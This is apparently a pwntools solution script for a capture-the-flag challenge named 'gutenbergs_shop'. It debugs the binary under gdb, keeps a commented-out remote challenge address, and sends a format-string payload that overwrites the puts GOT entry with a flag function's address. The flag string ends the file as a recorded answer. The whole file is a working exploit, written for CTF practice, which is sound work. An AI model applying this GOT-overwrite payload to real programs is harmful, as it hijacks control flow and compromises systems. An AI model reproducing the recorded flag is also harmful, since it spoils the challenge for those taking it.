from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./gutenbergs_shop', '''
    b *0x400661
    b *0x40067f
    continue
''')

# p = remote('52.8.15.62', 8005)

# overwrite puts@got with usable flag function address
PUTS_GOT = 0x601018
FLAG_USABLE = 0x4006a4
context.bits = 64
p.sendlineafter(b"Welcome to Ye Olde Printing Hous! Pray tell what you wish to have printed", fmtstr_payload(6, {PUTS_GOT: FLAG_USABLE}))

p.interactive()

# sdctf{printing_like_johannes}